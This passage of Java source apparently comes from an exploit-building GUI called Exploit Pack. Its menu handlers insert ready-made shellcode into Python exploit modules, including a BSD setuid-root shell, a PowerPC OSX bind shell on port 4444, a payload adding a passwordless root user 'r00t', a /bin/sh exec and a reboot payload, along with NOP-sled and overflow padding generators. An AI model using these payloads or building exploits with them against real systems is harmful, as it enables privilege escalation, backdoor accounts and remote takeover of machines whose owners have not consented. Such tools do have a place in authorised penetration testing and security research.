				Module.append("Shellcode = \"\\x31\\xc0\\x50\\x50\\xb0\\x17\\xcd\\x80\\x31\\xc0\\x50\\x68\\x30\\x30\\x84\\x79\\x79\\x30\\x73\\x7a\\x7f\\x89\\xe3\\x50\\x54\\x53\\x50\\xb0\\x3b\\xcd\\x80\" # Setuid(0) and runs /bin/sh\n");
			}
		});
		menuItem_12.setText("x86.bsd.suidsh ");

		MenuItem menuItem_13 = new MenuItem(menu_4, SWT.CASCADE);
		menuItem_13.setText("OSX");

		Menu menu_8 = new Menu(menuItem_13);
		menuItem_13.setMenu(menu_8);

		MenuItem menuItem_14 = new MenuItem(menu_8, SWT.NONE);
		menuItem_14.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.append("Shellcode = \"\\x38\\x60\\x00\\x02\\x38\\x80\\x00\\x01\\x38\\xa0\\x00\\x06\\x38\\x00\\x00\\x61\\x44\\x00\\x00\\x02\\x7c\\x00\\x02\\x78\\x7c\\x7e\\x1b\\x78\\x48\\x00\\x00\\x0d\\x00\\x02\\x11\\x5c\\x00\\x00\\x00\\x00\\x7c\\x88\\x02\\xa6\\x38\\xa0\\x00\\x10\\x38\\x00\\x00\\x68\\x7f\\xc3\\xf3\\x78\\x44\\x00\\x00\\x02\\x7c\\x00\\x02\\x78\\x38\\x00\\x00\\x6a\\x7f\\xc3\\xf3\\x78\\x44\\x00\\x00\\x02\\x7c\\x00\\x02\\x78\\x7f\\xc3\\xf3\\x78\\x38\\x00\\x00\\x1e\\x38\\x80\\x00\\x10\\x90\\x81\\xff\\xe8\\x38\\xa1\\xff\\xe8\\x38\\x81\\xff\\xf0\\x44\\x00\\x00\\x02\\x7c\\x00\\x02\\x78\\x7c\\x7e\\x1b\\x78\\x38\\xa0\\x00\\x02\\x38\\x00\\x00\\x5a\\x7f\\xc3\\xf3\\x78\\x7c\\xa4\\x2b\\x78\\x44\\x00\\x00\\x02\\x7c\\x00\\x02\\x78\\x38\\xa5\\xff\\xff\\x2c\\x05\\xff\\xff\\x40\\x82\\xff\\xe5\\x38\\x00\\x00\\x42\\x44\\x00\\x00\\x02\\x7c\\x00\\x02\\x78\\x7c\\xa5\\x2a\\x79\\x40\\x82\\xff\\xfd\\x7c\\x68\\x02\\xa6\\x38\\x63\\x00\\x28\\x90\\x61\\xff\\xf8\\x90\\xa1\\xff\\xfc\\x38\\x81\\xff\\xf8\\x38\\x00\\x00\\x3b\\x7c\\x00\\x04\\xac\\x44\\x00\\x00\\x02\\x7c\\x00\\x02\\x78\\x7f\\xe0\\x00\\x08\\x2f\\x62\\x69\\x6e\\x2f\\x63\\x73\\x68\\x00\\x00\\x00\\x00\" # Binds a shell at port 4444\n");
			}
		});
		menuItem_14.setText("ppc.osx.bind4444");

		MenuItem menuItem_15 = new MenuItem(menu_8, SWT.NONE);
		menuItem_15.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.append("Shellcode = \"\\x7c\\xa5\\x2a\\x79\\x40\\x82\\xff\\xfd\\x7d\\x48\\x02\\xa6\\x3b\\xea\\x01\\x70\\x39\\x60\\x01\\x70\\x39\\x1f\\xff\\x0d\\x7c\\xa8\\x29\\xae\\x38\\x7f\\xff\\x04\\x38\\x80\\x02\\x01\\x38\\xa0\\xff\\xff\\x38\\x0b\\xfe\\x95\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\\x38\\x9f\\xff\\x0e\\x38\\xab\\xfe\\xe5\\x38\\x0b\\xfe\\x94\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\\x38\\x0b\\xfe\\x96\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\\x7c\\xa5\\x2a\\x79\\x38\\x7f\\xff\\x04\\x90\\x61\\xff\\xf8\\x90\\xa1\\xff\\xfc\\x38\\x81\\xff\\xf8\\x38\\x0b\\xfe\\xcb\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\\x38\\x0b\\xfe\\x91\\x44\\xff\\xff\\x02\\x2f\\x74\\x6d\\x70\\x2f\\x78\\x2e\\x73\\x68\\x58\\x23\\x21\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x0a\\x2f\\x62\\x69\\x6e\\x2f\\x65\\x63\\x68\\x6f\\x20\\x27\\x72\\x30\\x30\\x74\\x3a\\x3a\\x39\\x39\\x39\\x3a\\x38\\x30\\x3a\\x3a\\x30\\x3a\\x30\\x3a\\x72\\x30\\x30\\x74\\x3a\\x2f\\x3a\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x27\\x20\\x7c\\x20\\x2f\\x75\\x73\\x72\\x2f\\x62\\x69\\x6e\\x2f\\x6e\\x69\\x6c\\x6f\\x61\\x64\\x20\\x2d\\x6d\\x20\\x70\\x61\\x73\\x73\\x77\\x64\\x20\\x2e\\x0a\" # Adds a root user named 'r00t' with no pass\n");
			}
		});
		menuItem_15.setText("ppc.osx.adduser ");

		MenuItem menuItem_16 = new MenuItem(menu_8, SWT.NONE);
		menuItem_16.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.append("Shellcode = \"\\x7c\\xa5\\x2a\\x79\\x40\\x82\\xff\\xfd\\x7d\\x68\\x02\\xa6\\x3b\\xeb\\x01\\x70\\x39\\x40\\x01\\x70\\x39\\x1f\\xfe\\xcf\\x7c\\xa8\\x29\\xae\\x38\\x7f\\xfe\\xc8\\x90\\x61\\xff\\xf8\\x90\\xa1\\xff\\xfc\\x38\\x81\\xff\\xf8\\x38\\x0a\\xfe\\xcb\\x44\\xff\\xff\\x02\\x7c\\xa3\\x2b\\x78\\x38\\x0a\\xfe\\x91\\x44\\xff\\xff\\x02\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x58\" # Executes /bin/sh\n");
			}
		});
		menuItem_16.setText("ppc.osx.binsh");

		MenuItem menuItem_17 = new MenuItem(menu_8, SWT.NONE);
		menuItem_17.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				Module.append("Shellcode = \"\\x7c\\x63\\x1a\\x79\\x39\\x40\\x01\\x70\\x38\\x0a\\xfe\\xb4\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\\x38\\x0a\\xfe\\xc7\\x44\\xff\\xff\\x02\" # Reboots the box\n");
			}
		});
		menuItem_17.setText("ppc.osx.reboot");

		MenuItem mntmJunk = new MenuItem(menu, SWT.CASCADE);
		mntmJunk.setText("Junk");

		Menu menu_9 = new Menu(mntmJunk);
		mntmJunk.setMenu(menu_9);

		MenuItem mntmNewItem_8 = new MenuItem(menu_9, SWT.NONE);
		mntmNewItem_8.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				JunkDialog Form = new JunkDialog();
				Form.open();
				Double ObtainHowMuch = Form.HowMuch(null);
				NewJunk = repeatString("\\x90", ObtainHowMuch.intValue());
				Module.append("NOPS = \"" + NewJunk + "\" # NOPSLED\n");
			}
		});
		mntmNewItem_8.setText("Nops - 0x90");

		MenuItem mntmNopsx = new MenuItem(menu_9, SWT.NONE);
		mntmNopsx.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				JunkDialog Form = new JunkDialog();
				Form.open();
				Double ObtainHowMuch = Form.HowMuch(null);
				NewJunk = repeatString("\\x60", ObtainHowMuch.intValue());
				Module.append("NOPS = \"" + NewJunk + "\" # NOPSLED\n");
			}
		});
		mntmNopsx.setText("Nops - 0x60");

		MenuItem mntmNewItem_9 = new MenuItem(menu_9, SWT.NONE);
		mntmNewItem_9.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				JunkDialog Form = new JunkDialog();
				Form.open();
				Double ObtainHowMuch = Form.HowMuch(null);
				NewJunk = repeatString("\\x41", ObtainHowMuch.intValue());
				Module.append(NewJunk);
				Module.append("JUNK = \"" + NewJunk + "\" # JUNK\n");
			}
		});
		mntmNewItem_9.setText("A's - 0x41");

		MenuItem mntmNewItem_10 = new MenuItem(menu_9, SWT.NONE);
		mntmNewItem_10.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				JunkDialog Form = new JunkDialog();
				Form.open();
				Double ObtainHowMuch = Form.HowMuch(null);
				NewJunk = repeatString("\\x42", ObtainHowMuch.intValue());
				Module.append(NewJunk);
				Module.append("JUNK = \"" + NewJunk + "\" # JUNK\n");
			}
		});
		mntmNewItem_10.setText("B's- 0x42");

		MenuItem mntmNewSubmenu_1 = new MenuItem(menu, SWT.CASCADE);
		mntmNewSubmenu_1.setText("Help");

		Menu menu_3 = new Menu(mntmNewSubmenu_1);
		mntmNewSubmenu_1.setMenu(menu_3);

		MenuItem mntmNewItem_5 = new MenuItem(menu_3, SWT.NONE);
		mntmNewItem_5.setText("Dynamic Help Online");

		MenuItem mntmNewItem_7 = new MenuItem(menu_3, SWT.NONE);
		mntmNewItem_7.setImage(SWTResourceManager.getImage(MainEditor.class,
				"/resources/help.png"));
		mntmNewItem_7.setText("Tutorials");

		new MenuItem(menu_3, SWT.SEPARATOR);

		MenuItem mntmNewItem_6 = new MenuItem(menu_3, SWT.NONE);
		mntmNewItem_6.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				com.exploitpack.main.About.main(null);
			}
		});
		mntmNewItem_6.setText("About - Module Editor");

		tltmOpenModule.addSelectionListener(new SelectionAdapter() {
			@Override
			public void widgetSelected(SelectionEvent e) {
				String OpenData = OpenFile();
				final CTabItem NewTab = new CTabItem(folder1, SWT.NONE);
				NewTab.setText("Old Module");

				final Text Module = new Text(folder1, SWT.BORDER | SWT.MULTI);
				NewTab.setControl(Module);

				Module.setText(OpenData);
			}
		});

	}

	// Repeat Strings
	public static String repeatString(String what, int times) {
		StringBuffer sb = new StringBuffer();

		for (int i = 0; i < times; i++) {
			sb.append(what);
		}

		return sb.toString();
	}

	// Save Module
	public void SaveFile(String DataToWrite) {
		FileDialog fileDialog = new FileDialog(shlExploitPack, SWT.SAVE);
		fileDialog.setText("Save");
		String codedir = "exploits/code";
		fileDialog.setFilterPath(codedir);
		String[] filterExt = { "*.py", "*.*" };
		fileDialog.setFilterExtensions(filterExt);
		String selected = fileDialog.open();
		if (selected == null)
			return;

		File file = new File(selected);
		try {
			FileWriter fileWriter = new FileWriter(file);
			fileWriter.write(DataToWrite);
			fileWriter.close();
		} catch (IOException e) {
			MessageBox messageBox = new MessageBox(shlExploitPack,
					SWT.ICON_ERROR | SWT.OK);
			messageBox.setMessage("File I/O Error.");
			messageBox.setText("Error");
			messageBox.open();
			return;
		}
	}

	// Open Module
	public String OpenFile() {
		FileDialog fileDialog = new FileDialog(shlExploitPack, SWT.OPEN);
		fileDialog.setText("Open");
		String codedir = "exploits/code";
		fileDialog.setFilterPath(codedir);
		String[] filterExt = { "*.py", "*.*" };
		fileDialog.setFilterExtensions(filterExt);
		String selected = fileDialog.open();
		if (selected == null)
			return null;
		// code here to open the file and display
		FileReader file = null;
		try {
			file = new FileReader(selected);
		} catch (FileNotFoundException e1) {
			MessageBox messageBox = new MessageBox(shlExploitPack,
					SWT.ICON_ERROR | SWT.OK);
			messageBox.setMessage("Could not open file.");
			messageBox.setText("Error");
			messageBox.open();
			return null;
		}
		BufferedReader fileInput = new BufferedReader(file);
		String text = null;
		StringBuffer sb = new StringBuffer();
		try {
			do {
				if (text != null)
					sb.append(text + "\n");
			} while ((text = fileInput.readLine()) != null);
			return sb.toString();
		} catch (IOException e1) {
			MessageBox messageBox = new MessageBox(shlExploitPack,
					SWT.ICON_ERROR | SWT.OK);
			messageBox.setMessage("Could not write to file.");
			messageBox.setText("Error");
			messageBox.open();
			return null;
		}

	}
}
